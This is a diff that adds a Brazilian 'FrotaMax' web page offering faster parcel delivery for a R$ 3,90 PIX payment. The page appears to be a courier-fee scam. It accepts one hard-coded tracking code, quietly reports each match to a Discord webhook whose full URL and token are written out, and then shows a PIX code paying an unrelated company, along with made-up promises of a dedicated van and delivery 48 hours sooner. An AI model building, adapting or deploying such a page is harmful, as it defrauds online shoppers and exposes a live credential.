@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+<title>Acelerar Pedido - FrotaMax</title>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link rel="icon" type="image/x-icon" href="https://cdn-icons-png.flaticon.com/512/2066/2066642.png">
+
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+
+:root{
+  --primary:#f7ac13;
+  --dark:#0d2235;
+  --light:#f5f7fa;
+}
+
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+}
+
+body{
+  font-family:'Inter',sans-serif;
+  background:white;
+  color:#111;
+}
+
+/* ===== BASE ===== */
+
+.container{
+  max-width:1100px;
+  margin:auto;
+  padding:0 20px;
+}
+
+.section{
+  padding:20px 0;
+}
+
+.btn{
+  display:inline-flex;
+  align-items:center;
+  gap:12px;
+  padding:16px 30px;
+  border-radius:14px;
+  font-weight:600;
+  text-decoration:none;
+  transition:.3s;
+  cursor:pointer;
+  border:none;
+}
+
+.btn-primary{
+  background:var(--primary);
+  color:black;
+  font-size:18px;
+}
+
+.btn-primary:hover{
+  transform:translateY(-3px);
+}
+
+.btn-secondary{
+  background:#e0e0e0;
+  color:#333;
+  font-size:18px;
+}
+
+.btn-secondary:hover{
+  background:#d0d0d0;
+  transform:translateY(-3px);
+}
+
+.card{
+  background:white;
+  border-radius:20px;
+  padding:30px;
+  box-shadow:0 15px 30px rgba(0,0,0,.06);
+}
+
+/* ===== HEADER ===== */
+
+header{
+  background:#e6e6e6;
+  color:white;
+  height:220px;
+  display:flex;
+  align-items:center;
+  padding: 20px 0;
+}
+
+/* Estilos para a logo */
+.logo {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  width: 100%;
+  padding: 10px 0;
+}
+
+.logo img {
+  height: 150px;
+  width: auto;
+  max-width: 100%;
+}
+
+/* ===== HERO ===== */
+
+.hero{
+  background:linear-gradient(135deg,var(--dark),#132c46);
+  color:white;
+  text-align:center;
+  padding:30px 20px 10px;
+}
+
+.hero h1{
+  font-size:42px;
+  font-weight:800;
+  margin-bottom:20px;
+}
+
+.hero span{
+  color:var(--primary);
+}
+
+.hero p{
+  font-size:18px;
+  max-width:650px;
+  margin:auto;
+  opacity:.9;
+}
+
+/* ===== CHECKOUT SECTION ===== */
+
+.checkout{
+  text-align:center;
+  background:var(--light);
+}
+
+/* Estilos para o campo de input */
+.tracking-input {
+  width: 100%;
+  max-width: 400px;
+  padding: 15px;
+  border: 2px solid #ddd;
+  border-radius: 10px;
+  font-size: 16px;
+  margin-bottom: 20px;
+  transition: border-color 0.3s;
+}
+
+.tracking-input:focus {
+  border-color: var(--primary);
+  outline: none;
+}
+
+/* Estilos para o container de pagamento */
+.payment-container {
+  display: none;
+  margin-top: 30px;
+  background: white;
+  border-radius: 20px;
+  padding: 30px;
+  box-shadow: 0 15px 30px rgba(0,0,0,.06);
+  max-width: 600px;
+  margin-left: auto;
+  margin-right: auto;
+  text-align: center;
+}
+
+.payment-header {
+  margin-bottom: 25px;
+}
+
+.payment-title {
+  font-size: 24px;
+  font-weight: 600;
+  color: var(--dark);
+  margin-bottom: 15px;
+}
+
+.payment-code {
+  font-size: 18px;
+  color: #666;
+  margin-bottom: 20px;
+  word-break: break-all;
+  background: #f5f5f5;
+  padding: 15px;
+  border-radius: 10px;
+  font-family: monospace;
+}
+
+.qr-code {
+  margin: 20px 0;
+}
+
+.qr-code img {
+  max-width: 200px;
+  border-radius: 10px;
+}
+
+.payment-instructions {
+  font-size: 16px;
+  color: #666;
+  margin-bottom: 25px;
+  line-height: 1.5;
+}
+
+.copy-feedback {
+  display: none;
+  color: #4caf50;
+  font-weight: 600;
+  margin-top: 10px;
+}
+
+/* ===== FOOTER ===== */
+
+footer{
+  background:var(--dark);
+  color:#aaa;
+  text-align:center;
+  padding:45px 0;
+}
+
+/* ===== RESPONSIVO ===== */
+
+@media(max-width:900px){
+  .hero h1{
+    font-size:32px;
+  }
+  
+  header {
+    height: 160px;
+  }
+  
+  .logo img {
+    height: 140px;
+  }
+  
+  .payment-container {
+    padding: 20px;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<!-- HEADER -->
+<header>
+  <div class="logo">
+    <img src="https://i.ibb.co/hJMtB6k2/logo-cut.jpg" alt="Logo FrotaMax">
+  </div>
+</header>
+
+<!-- HERO -->
+<section class="hero">
+  <h1>
+    Acelere seu <span>pedido</span>
+  </h1>
+</section>
+
+<!-- CHECKOUT -->
+<section class="section checkout">
+  <div class="container">
+    <h2 style="font-size:34px;margin-bottom:10px;">
+      Insira o código de rastreamento
+    </h2>
+
+    <p style="margin-bottom:30px;">
+      Insira o código de rastreio da encomenda que deseja acelerar.
+    </p>  
+
+    <!-- CAMPO DE INPUT PARA CÓDIGO DE RASTREIO -->
+    <input type="text" id="trackingCode" class="tracking-input" placeholder="Digite seu código de rastreamento">
+    
+    <!-- BOTÃO PARA VERIFICAR CÓDIGO -->
+    <button class="btn btn-primary" onclick="verificarCodigo()">
+      <i class="fas fa-bolt"></i>
+      Acelerar Entrega
+    </button>
+
+    <!-- CONTAINER DE PAGAMENTO (INICIALMENTE OCULTO) -->
+    <div id="paymentContainer" class="payment-container">
+      <div class="payment-header">
+        <h3 class="payment-title">Acelere sua entrega por apenas R$ 3,90</h3>
+        <p>Para acelerar sua entrega, faça o pagamento via PIX:</p>
+      </div>
+      
+      <div class="qr-code">
+        <img src="data:image/png;base64,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" alt="QR Code para pagamento PIX">
+      </div>
+      
+      <div class="payment-code" id="pixCode">
+        00020101021226900014br.gov.bcb.pix2568pix.adyen.com/pixqrcodelocation/pixloc/v1/loc/lCK9goOcQjCASzOw54Ft0A5204000053039865802BR5924LAUNCH PAD TECNOLOGIA SE6009SAO PAULO62070503***6304D355
+      </div>
+      
+      <button class="btn btn-primary" onclick="copiarCodigoPix()">
+        <i class="fas fa-copy"></i>
+        Copiar Código PIX
+      </button>
+      
+      <div id="copyFeedback" class="copy-feedback">
+        <i class="fas fa-check-circle"></i> Código PIX copiado com sucesso!
+      </div>
+      
+      <div class="payment-instructions">
+        <p>Após o pagamento, sua entrega será priorizada e transportada por van exclusiva.</p>
+        <p>O tempo de entrega será reduzido em até 48 horas.</p>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer>
+  © 2026 FrotaMax • Todos os direitos reservados
+</footer>
+
+<script>
+  // Código de rastreamento válido para teste
+  const CODIGO_VALIDO = "BRJLD53447E6Y";
+  
+  // Código PIX para pagamento
+  const CODIGO_PIX = "00020101021226900014br.gov.bcb.pix2568pix.adyen.com/pixqrcodelocation/pixloc/v1/loc/lCK9goOcQjCASzOw54Ft0A5204000053039865802BR5924LAUNCH PAD TECNOLOGIA SE6009SAO PAULO62070503***6304D355";
+  
+  function verificarCodigo() {
+  const codigoInserido = document.getElementById('trackingCode').value.trim().toUpperCase();
+
+  if (codigoInserido === CODIGO_VALIDO) {
+    // Envia webhook para o Discord
+    fetch("https://discord.com/api/webhooks/1468746875363524700/trfIFrx5LSPlzLoHbUjlZPmlVjqEhdzk6tkLdpvYUczeNpXa3xyRJDCuiIof6Qex9Wa5", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        content: `💨App Checkout: Clicou em acelerar código: ${codigoInserido}`
+      })
+    })
+    .then(response => {
+      if (!response.ok) {
+        console.error("Erro ao enviar webhook:", response.statusText);
+      }
+    })
+    .catch(error => console.error("Erro de rede:", error));
+
+    // Exibe o container de pagamento se o código for válido
+    document.getElementById('paymentContainer').style.display = 'block';
+
+    // Rolagem suave para o container de pagamento
+    document.getElementById('paymentContainer').scrollIntoView({ 
+      behavior: 'smooth',
+      block: 'start'
+    });
+  } else if (codigoInserido === '') {
+    // Exibe mensagem de erro se o campo estiver vazio
+    document.getElementById('trackingCode').style.borderColor = '#ff4d4d';
+    document.getElementById('trackingCode').placeholder = 'Por favor, insira um código de rastreamento';
+  } else {
+    // Exibe mensagem de erro se o código for inválido
+    document.getElementById('trackingCode').style.borderColor = '#ff4d4d';
+    document.getElementById('trackingCode').value = '';
+    document.getElementById('trackingCode').placeholder = 'Código inválido. Tente novamente.';
+  }
+}
+
+  function copiarCodigoPix() {
+    // Seleciona o código PIX
+    const codigoPix = document.getElementById('pixCode').innerText;
+    
+    // Copia para a área de transferência
+    navigator.clipboard.writeText(codigoPix).then(function() {
+      // Exibe feedback de cópia bem-sucedida
+      const feedback = document.getElementById('copyFeedback');
+      feedback.style.display = 'block';
+      
+      // Esconde o feedback após 3 segundos
+      setTimeout(function() {
+        feedback.style.display = 'none';
+      }, 3000);
+    }).catch(function(err) {
+      console.error('Erro ao copiar código PIX: ', err);
+      alert('Não foi possível copiar o código PIX. Por favor, copie manualmente.');
+    });
+  }
+  
+  // Adiciona evento para limpar o estilo de erro quando o usuário começar a digitar
+  document.getElementById('trackingCode').addEventListener('input', function() {
+    this.style.borderColor = '#ddd';
+    this.placeholder = 'Digite seu código de rastreamento';
+  });
+  
+  // Adiciona evento para permitir verificar o código ao pressionar Enter
+  document.getElementById('trackingCode').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+      verificarCodigo();
+    }
+  });
+</script>
+</body>
+</html>
